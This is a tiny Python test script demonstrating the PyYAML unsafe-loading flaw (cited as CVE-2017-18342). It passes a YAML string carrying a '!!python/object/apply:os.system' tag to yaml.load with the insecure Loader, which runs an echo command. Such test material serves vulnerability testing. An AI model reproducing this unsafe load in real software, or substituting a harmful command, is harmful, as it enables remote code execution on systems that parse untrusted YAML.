# test_yaml_vuln.py
import yaml

vulnerable_data = "!!python/object/apply:os.system ['echo Vulnerable to YAML RCE']"
yaml.load(vulnerable_data, Loader=yaml.Loader)  # Insecure usage (CVE-2017-18342)
